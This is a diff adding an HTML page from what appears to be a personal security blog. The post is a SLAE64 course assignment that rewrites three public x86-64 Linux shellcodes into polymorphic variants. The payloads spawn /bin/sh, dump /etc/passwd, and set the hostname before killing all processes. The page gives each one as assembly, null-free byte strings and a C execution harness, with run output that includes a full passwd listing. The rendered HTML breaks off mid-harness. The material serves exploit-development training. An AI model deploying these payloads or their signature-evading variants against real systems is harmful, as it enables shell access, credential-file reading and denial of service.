@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Slae64 Assignment 6 - Polymorphic Shellcode | nibbles</title>
+<meta name="keywords" content="slae64">
+<meta name="description" content="This post introduces my 6th mission to my SLAE64 journey.
+Some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.
+There is a lof of overlap information with my post regarding the SLAE32 - Polymorphic Shellcode. I advice you to take look at if haven&rsquo;t done already.">
+<meta name="author" content="nibbles">
+<link rel="canonical" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_6/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Slae64 Assignment 6 - Polymorphic Shellcode" />
+<meta property="og:description" content="This post introduces my 6th mission to my SLAE64 journey.
+Some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.
+There is a lof of overlap information with my post regarding the SLAE32 - Polymorphic Shellcode. I advice you to take look at if haven&rsquo;t done already." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_6/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-01T22:40:23+00:00" />
+<meta property="article:modified_time" content="2023-01-01T22:40:23+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Slae64 Assignment 6 - Polymorphic Shellcode"/>
+<meta name="twitter:description" content="This post introduces my 6th mission to my SLAE64 journey.
+Some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.
+There is a lof of overlap information with my post regarding the SLAE32 - Polymorphic Shellcode. I advice you to take look at if haven&rsquo;t done already."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xnibbles.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Slae64 Assignment 6 - Polymorphic Shellcode",
+      "item": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_6/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Slae64 Assignment 6 - Polymorphic Shellcode",
+  "name": "Slae64 Assignment 6 - Polymorphic Shellcode",
+  "description": "This post introduces my 6th mission to my SLAE64 journey.\nSome existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.\nThere is a lof of overlap information with my post regarding the SLAE32 - Polymorphic Shellcode. I advice you to take look at if haven\u0026rsquo;t done already.",
+  "keywords": [
+    "slae64"
+  ],
+  "articleBody": " This post introduces my 6th mission to my SLAE64 journey.\nSome existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.\nThere is a lof of overlap information with my post regarding the SLAE32 - Polymorphic Shellcode. I advice you to take look at if haven’t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.\nIntroduction The SLAE64 6th assignment task is to select 3 shellcode payloads from shell-storm and create polymorphic versions of them without increasng the size of the shellcode by more than 50%;\nBonus points if we can make it shorter inlength compared to the original.\nShellcode 1 - execve(/bin/sh, [/bin/sh], NULL) –\nThis shellcode was written by hophet, and is located here. This shellcode calls execve sycall and executes /bin/sh.\nSize: 41 bytes\nThe original shellcode is in AT\u0026T syntax but I’ll show in Intel syntax as it more intuite for me.\n; [Linux/X86-64] ; Dummy for shellcode: ; execve(\"/bin/sh\", [\"/bin/sh\"], NULL) ; hophet [at] gmail.com _start: xor rdx, rdx mov rbx, 0x68732f6e69622fff shr rbx, 0x8 push rbx mov rdi, rsp xor rax, rax push rax push rdi mov rsi, rsp mov al, 0x3b ; execve(3b) syscall push 0x1 pop rdi push 0x3c ; exit(3c) pop rax syscall Let’s see what we can do here.\nPolymorphic Version _start: xor rsi, rsi mul rsi mov r9, 0x68732f6e69622fff shr r9, 0x8 mov [rsp-0x8], r9 lea rdi, [rsp-8] add al, 0x3b ; execve(3b) syscall push 0x1 pop rdi push 0x3c ; exit(3c) pop rax syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› ╰─$ ../../../assembler.sh poly_execve.nasm [*] Compiling with NASM [*] Linking ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000 [*] Extracting opcodes [*] Done Shellcode size: 42 \"\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x49\\xb9\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe9\\x08\\x4c\\x89\\x4c\\x24\\xf8\\x48\\x8d\\x7c\\x24\\xf8\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58\\x0f\\x05\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x49\\xb9\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe9\\x08\\x4c\\x89\\x4c\\x24\\xf8\\x48\\x8d\\x7c\\x24\\xf8\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58\\x0f\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› ╰─$ ./shellcode Shellcode Length: 42 $ whoami edu $ Size: 42 bytes\nIncreased 1 byte which is more 2,4% in size compared to the original.\nShellcode 2 - Read /etc/passwd This shellcode was written by Mr.Un1k0d3r, and is located here. This shellcode reads the /etc/passwd file to stdout.\nSize: 82 bytes\nBITS 64 ; Author Mr.Un1k0d3r - RingZer0 Team ; Read /etc/passwd Linux x86_64 Shellcode ; Shellcode size 82 bytes global _start section .text _start: jmp _push_filename _readfile: ; syscall open file pop rdi ; pop path value ; NULL byte fix xor byte [rdi + 11], 0x41 xor rax, rax add al, 2 xor rsi, rsi ; set O_RDONLY flag syscall ; syscall read file sub sp, 0xfff lea rsi, [rsp] mov rdi, rax xor rdx, rdx mov dx, 0xfff; size to read xor rax, rax syscall ; syscall write to stdout xor rdi, rdi add dil, 1 ; set stdout fd = 1 mov rdx, rax xor rax, rax add al, 1 syscall ; syscall exit xor rax, rax add al, 60 syscall _push_filename: call _readfile path: db \"/etc/passwdA\" The shellcode has some tricks to use less space but we can be even more “space friendly”. In comments we have the instructions that were changed and below their polymorphic version.\nPolymorphic Version jmp _readfile path: db 0x2f,0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x73,0x77,0x64 _readfile: ; syscall open file ;pop rdi ; pop path value lea rdi, [rel path] ; NULL byte fix ;xor byte [rdi + 11], 0x41 shr byte [rdi+11], 8 ;xor rax, rax ;add al, 2 push byte 0x2 pop rax xor rsi, rsi ; set O_RDONLY flag syscall ; syscall read file sub sp, 0xfff lea rsi, [rsp] mov rdi, rax xor rax, rax cdq mov dx, 0xfff; size to read syscall ; syscall write to stdout push byte 0x1 ; set stdout fd = 1 pop rdi mov rdx, rax push byte 0x1 pop rax syscall ; syscall exit push byte 60 pop rax syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ ../../../assembler.sh poly_read_passwd.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 70 \"\\xeb\\x0b\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x48\\x8d\\x3d\\xee\\xff\\xff\\xff\\xc0\\x6f\\x0b\\x08\\x6a\\x02\\x58\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xc0\\x99\\x66\\xba\\xff\\x0f\\x0f\\x05\\x6a\\x01\\x5f\\x48\\x89\\xc2\\x6a\\x01\\x58\\x0f\\x05\\x6a\\x3c\\x58\\x0f\\x05\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\xeb\\x0b\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x48\\x8d\\x3d\\xee\\xff\\xff\\xff\\xc0\\x6f\\x0b\\x08\\x6a\\x02\\x58\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xc0\\x99\\x66\\xba\\xff\\x0f\\x0f\\x05\\x6a\\x01\\x5f\\x48\\x89\\xc2\\x6a\\x01\\x58\\x0f\\x05\\x6a\\x3c\\x58\\x0f\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ ./shellcode Shellcode Length: 70 root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:107:113:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:108:117:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:110:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:111:120::/var/lib/saned:/usr/sbin/nologin colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false lightdm:x:114:122:Light Display Manager:/var/lib/lightdm:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin edu:x:1000:1000:edu:/home/edu:/usr/bin/zsh Size: 70 bytes\nReduced 12 bytes!!! This is a reduction of 14,6% in size compared to the original.\nI’ve made the same exercise for the 32bit version but I only could increase the code size. Having in the 64bit version less 14,6% is a real great achievement for me.\nShellcode 3 - setHostname() \u0026 killall This shellcode was written by zbt, and is located here. This shellcode sets the hostname to “Rooted !” and kills all the processes.\nSize: 33 bytes\n; sethostname(\"Rooted !\"); ; kill(-1, SIGKILL); section .text global _start _start: ;-- setHostName(\"Rooted !\"); 22 bytes --; mov al, 0xaa mov r8, 'Rooted !' push r8 mov rdi, rsp mov sil, 0x8 syscall ;-- kill(-1, SIGKILL); 11 bytes --; push byte 0x3e pop rax push byte 0xff pop rdi push byte 0x9 pop rsi syscall Simple short shellcode without many room for improvements.\nPolymorphic Version ; sethostname(\"Rooted !\"); ; kill(-1, SIGKILL); section .text global _start _start: ;-- setHostName(\"Rooted !\"); 22 bytes --; sethostname: xor rax, rax\t; zeroing out rax xor rsi, rsi add\tal, 0xaa mov\tr9, 0x21206465746F6F52\t; Rooted ! push r9\tmov rdi, rsp\tadd sil, 0x8\t; and subing it down to 0x08 syscall ;-- kill(-1, SIGKILL); 11 bytes --; xor rax, rax add al, 0x3e mov rdi, rax sub rdi, 0x3f inc rsi syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/setHostname_killall-605 ‹main●› ╰─$ ../../../assembler.sh poly_setHostaname_killall.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 46 \"\\x48\\x31\\xc0\\x48\\x31\\xf6\\x04\\xaa\\x49\\xb9\\x52\\x6f\\x6f\\x74\\x65\\x64\\x20\\x21\\x41\\x51\\x48\\x89\\xe7\\x40\\x80\\xc6\\x08\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3e\\x48\\x89\\xc7\\x48\\x83\\xef\\x3f\\x48\\xff\\xc6\\x0f\\x05\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\x48\\x31\\xc0\\x48\\x31\\xf6\\x04\\xaa\\x49\\xb9\\x52\\x6f\\x6f\\x74\\x65\\x64\\x20\\x21\\x41\\x51\\x48\\x89\\xe7\\x40\\x80\\xc6\\x08\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3e\\x48\\x89\\xc7\\x48\\x83\\xef\\x3f\\x48\\xff\\xc6\\x0f\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/setHostname_killall-605 ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:8:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ ./shellcode Shellcode Length: 70 root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin After executing the shellcode, we get logged out of the session and the hostname is changed\nSize: 46 bytes\nIncreased 39,4%, which reflects the additional 13 bytes.\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n",
+  "wordCount" : "1266",
+  "inLanguage": "en",
+  "datePublished": "2023-01-01T22:40:23Z",
+  "dateModified": "2023-01-01T22:40:23Z",
+  "author":{
+    "@type": "Person",
+    "name": "nibbles"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_6/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nibbles",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xnibbles.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xnibbles.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/about.html" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Slae64 Assignment 6 - Polymorphic Shellcode
+    </h1>
+    <div class="post-meta"><span title='2023-01-01 22:40:23 +0000 UTC'>January 1, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;nibbles
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a><ul>
+                        
+                <li>
+                    <a href="#shellcode-1---execvebinsh-binsh-null" aria-label="Shellcode 1 - execve(/bin/sh, [/bin/sh], NULL)">Shellcode 1 - execve(/bin/sh, [/bin/sh], NULL)</a><ul>
+                        
+                <li>
+                    <a href="#polymorphic-version" aria-label="Polymorphic Version">Polymorphic Version</a></li></ul>
+                </li>
+                <li>
+                    <a href="#shellcode-2---read-etcpasswd" aria-label="Shellcode 2 - Read /etc/passwd">Shellcode 2 - Read /etc/passwd</a><ul>
+                        
+                <li>
+                    <a href="#polymorphic-version-1" aria-label="Polymorphic Version">Polymorphic Version</a></li></ul>
+                </li>
+                <li>
+                    <a href="#shellcode-3---sethostname--killall" aria-label="Shellcode 3 - setHostname() &amp;amp; killall">Shellcode 3 - setHostname() &amp; killall</a><ul>
+                        
+                <li>
+                    <a href="#polymorphic-version-2" aria-label="Polymorphic Version">Polymorphic Version</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="/slae64/slae64.png#center" alt="SLAE64"  title="SLAE64"  />
+</p>
+<p>This post introduces my 6th mission to my SLAE64 journey.</p>
+<p>Some existing tools, such as ADMutate, that will XOR-encrypt existing shellcode and attach loader code to it. This is definitely useful, but writing polymorphic shellcode without a tool is a much better learning experience.</p>
+<p>There is a lof of overlap information with my post regarding the <a href="/posts/slae_32_assignment_6/">SLAE32 - Polymorphic Shellcode</a>. I advice you to take look at if haven&rsquo;t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.</p>
+<h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
+<p>The SLAE64 6th assignment task is to select 3 shellcode payloads from <a href="http://shell-storm.org/shellcode/">shell-storm</a> and create polymorphic versions of them without increasng the size of the shellcode by more than 50%;</p>
+<p>Bonus points if we can make it shorter inlength compared to the original.</p>
+<h2 id="shellcode-1---execvebinsh-binsh-null">Shellcode 1 - execve(/bin/sh, [/bin/sh], NULL)<a hidden class="anchor" aria-hidden="true" href="#shellcode-1---execvebinsh-binsh-null">#</a></h2>
+<p>&ndash;</p>
+<p>This shellcode was written by <code>hophet</code>, and is located <a href="http://www.shell-storm.org/shellcode/files/shellcode-76.html">here</a>. This shellcode calls execve sycall and executes <code>/bin/sh</code>.</p>
+<p><strong>Size: 41 bytes</strong></p>
+<p>The original shellcode is in AT&amp;T syntax but I&rsquo;ll show in Intel syntax as it more intuite for me.</p>
+<pre tabindex="0"><code>; [Linux/X86-64]
+; Dummy for shellcode:
+; execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;], NULL)
+; hophet [at] gmail.com
+_start:
+    xor    rdx, rdx
+    mov    rbx, 0x68732f6e69622fff
+    shr rbx, 0x8
+    push    rbx
+    mov    rdi, rsp
+    xor    rax, rax
+    push   rax
+    push   rdi
+    mov    rsi, rsp
+    mov al, 0x3b   ; execve(3b)
+    syscall
+    push  0x1
+    pop rdi
+    push  0x3c     ; exit(3c)
+    pop rax
+    syscall
+</code></pre><p>Let&rsquo;s see what we can do here.</p>
+<h3 id="polymorphic-version">Polymorphic Version<a hidden class="anchor" aria-hidden="true" href="#polymorphic-version">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>   <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mul</span>   <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>  <span style="color:#66d9ef">r9</span>, <span style="color:#ae81ff">0x68732f6e69622fff</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">shr</span> <span style="color:#66d9ef">r9</span>, <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">rsp-0x8</span>], <span style="color:#66d9ef">r9</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>   <span style="color:#66d9ef">rdi</span>, [<span style="color:#66d9ef">rsp-8</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x3b</span>   <span style="color:#75715e">; execve(3b)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span>  <span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span>  <span style="color:#ae81ff">0x3c</span>     <span style="color:#75715e">; exit(3c)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../../assembler.sh poly_execve.nasm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span>ld: warning: cannot find entry symbol _start; defaulting to <span style="color:#ae81ff">0000000000401000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x31\xf6\x48\xf7\xe6\x49\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe9\x08\x4c\x89\x4c\x24\xf8\x48\x8d\x7c\x24\xf8\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
